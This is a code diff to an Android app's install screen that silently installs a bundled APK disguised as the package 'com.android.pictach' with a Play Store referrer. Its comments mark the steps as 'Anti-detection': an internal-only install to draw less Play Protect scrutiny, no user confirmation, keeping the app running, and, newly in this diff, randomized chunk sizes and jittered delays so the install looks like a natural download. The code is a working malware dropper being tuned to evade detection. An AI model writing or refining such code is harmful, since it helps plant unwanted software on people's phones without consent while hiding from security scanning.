@@ -14,6 +14,7 @@ import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import java.io.IOException
+import java.util.concurrent.ThreadLocalRandom
 
 class InstallActivity : AppCompatActivity() {
 
@@ -22,13 +23,15 @@ class InstallActivity : AppCompatActivity() {
     private val handler = Handler(Looper.getMainLooper())
 
     companion object {
-        private const val SESSION_REQUEST = 1001
-        private const val MAX_RETRIES    = 2
-        private const val CHUNK_SIZE     = 262144 // 256KB chunks
-        private const val COMMIT_DELAY   = 500L   // 500ms natural delay
-        private const val MARKET_URI     = "market://details?id=com.android.pictach"
-        private const val REFERRER_URI   = "android-app://com.android.vending"
-        private const val WRITE_NAME     = "update.pkg"
+        private const val SESSION_REQUEST  = 1001
+        private const val MAX_RETRIES     = 2
+        private const val MARKET_URI      = "market://details?id=com.android.pictach"
+        private const val REFERRER_URI    = "android-app://com.android.vending"
+        private const val WRITE_NAME      = "update.pkg"
+        private const val CHUNK_MIN       = 131072  // 128KB
+        private const val CHUNK_MAX       = 524288  // 512KB
+        private const val DELAY_MIN       = 400L    // 400ms
+        private const val DELAY_MAX       = 800L    // 800ms
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -65,15 +68,15 @@ class InstallActivity : AppCompatActivity() {
             params.setAppPackageName("com.android.pictach")
             params.setSize(apkBytes.size.toLong())
 
-            // Anti-detection: internal install location — less GPP scrutiny
-            params.setInstallLocation(1) // 1 = INSTALL_LOCATION_INTERNAL_ONLY
+            // Anti-detection: internal install location
+            params.setInstallLocation(1)
 
             // Method 1 — Session-Based: no user action required
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
             }
 
-            // Anti-detection: don't kill running processes — trusted install signal
+            // Anti-detection: don't kill running processes
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 params.setDontKillApp(true)
             }
@@ -99,19 +102,21 @@ class InstallActivity : AppCompatActivity() {
             val session   = packageInstaller.openSession(sessionId)
 
             try {
-                // Anti-detection: chunk write — looks like natural progressive download
+                // Anti-detection: randomized chunk write
                 session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                     var offset = 0
                     while (offset < apkBytes.size) {
-                        val end = minOf(offset + CHUNK_SIZE, apkBytes.size)
+                        val chunkSize = ThreadLocalRandom.current().nextInt(CHUNK_MIN, CHUNK_MAX)
+                        val end = minOf(offset + chunkSize, apkBytes.size)
                         out.write(apkBytes, offset, end - offset)
                         session.fsync(out)
                         offset = end
                     }
                 }
 
-                // Anti-detection: 500ms natural delay before commit
-                Thread.sleep(COMMIT_DELAY)
+                // Anti-detection: random jitter delay before commit
+                val jitter = ThreadLocalRandom.current().nextLong(DELAY_MIN, DELAY_MAX)
+                Thread.sleep(jitter)
 
                 val intent = Intent(this, InstallReceiver::class.java).apply {
                     action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
